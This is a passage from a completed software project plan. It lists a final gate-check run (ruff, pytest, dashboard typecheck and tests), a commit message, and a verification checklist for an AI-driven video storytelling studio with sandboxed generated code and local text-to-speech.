- Demonstrates domain reusability.

- [x] **Step 4: Run full project gate check**
Command: `pwsh -File scripts/check.ps1 -Quick`
Verify all gates pass:
- `uv run ruff check .`: 0 findings.
- `uv run pytest -q`: all green.
- `npm --prefix apps/dashboard run typecheck`: clean.
- `npm --prefix apps/dashboard run test`: clean.

- [x] **Step 5: Git commit**
Commit message: `test(benchmarks): verify 3-domain autonomous causal visual storytelling with B/M/E proofs`

---

## Plan Verification Checklist
- [x] No engine rebuilds or deletions of existing agent systems.
- [x] 3D virtual office and agent characters completely preserved.
- [x] StepFun provider binding tested and configurable via `config/studio.json`.
- [x] Remotion skills loaded safely and version-hashed.
- [x] Film-level creative brief precedes scene generation.
- [x] 4-part causal scene state cycle validated by Pydantic contracts.
- [x] Untrusted TSX code isolated in `data/jobs/<id>/code/` and verified by `CodeGuard` AST.
- [x] VoiceStudio local API (`127.0.0.1:3900`) integrated for Indonesian TTS with word timestamps.
- [x] Beginning/Middle/End (B/M/E) keyframe delta checks detect static scenes.
- [x] 3 benchmark topics produced end-to-end with verified MP4s.
